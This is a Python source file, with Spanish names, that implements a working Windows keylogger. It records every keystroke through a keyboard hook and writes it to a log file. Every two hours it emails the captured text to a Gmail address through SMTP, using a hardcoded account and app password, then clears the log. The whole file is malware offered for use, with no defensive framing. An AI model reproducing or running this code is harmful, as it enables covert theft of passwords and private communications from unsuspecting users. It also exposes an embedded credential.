# coding: utf-8 
import pyHook, pythoncom, logging, time, datetime

carpeta_destino = ".\\result_keylogger.txt"
segundos_esperar = 7200
timeout = time.time() + segundos_esperar

def Timeout():
    if time.time() > timeout:
        return True
    else:
        return False

def EnviarEmail():
    with open (carpeta_destino, 'r+') as f:
        with open (".\\data.txt", 'r+') as b:
            fecha = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            data = f.read().replace("Space"," ").replace("\n","").replace("Capital","(BloqMayus)").replace("Lshift","(Shift)").replace("Lcontrol","(control)").replace("Rcontrol","(control)").replace("Rshift","(Shift)").replace("Tab","(Tab)")
            data = data.replace("Escape","(Esc)").replace("'Return","(Enter)").replace("Up","↑").replace("Left","←").replace("Down","↓").replace("Right","→").replace("Back","(deleted)").replace("Numlock","(Numlock)").replace("Add","(+)").replace("Subtract","(-)")
            data = data.replace("Lwin","(WIN)").replace("Lmenu","(Alt)").replace("Rmenu","(AltGr)").replace("Oem_Comma","(,)").replace("Oem_Period","(.)").replace("'Oem_Minus","(-)").replace("Oem_5","|").replace("Oem_4","'")
            data = data.replace("Oem_6","¿").replace("Divide","(/)").replace("Multiply","(*)").replace("Oem_7","({)").replace("Oem_2","(})").replace("Oem_Plus","(~)").replace("Oem_1","(´´)").replace("","").lower()
            g = b.read()
            data = "Mensaje capturado a las: " + fecha + "\n" + data
            print(data)
            crearEmail('pabloenriquec256@gmail.com','ywpxtqegplmbkbxt','pabloenriquec256@gmail.com',g ,data)
            f.seek(0)
            f.truncate()
def crearEmail(user,passw,recep,subj,body):
    import smtplib
    mailUser = user
    mailPass = passw
    From = user
    To = recep
    Subject = subj
    Txt = body

    email = """\From: %s\nTo: %s\nSubject: %s\n\n%s """ % (From, ", ".join(To), Subject, Txt)
    try:
        server = smtplib.SMTP("smtp.gmail.com",587)
        server.ehlo()
        server.starttls()
        server.login(mailUser,mailPass)
        server.sendmail(From, To, email)
        server.close()
    except:
        pass


def OnKeyboardEvent(event):
    logging.basicConfig(filename=carpeta_destino, level=logging.DEBUG, format='%(message)s')
    logging.log(10, event.Key)
    return True

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown= OnKeyboardEvent
hooks_manager.HookKeyboard()

while True:
    if Timeout():
        EnviarEmail()
        timeout = time.time() + segundos_esperar
    pythoncom.PumpWaitingMessages()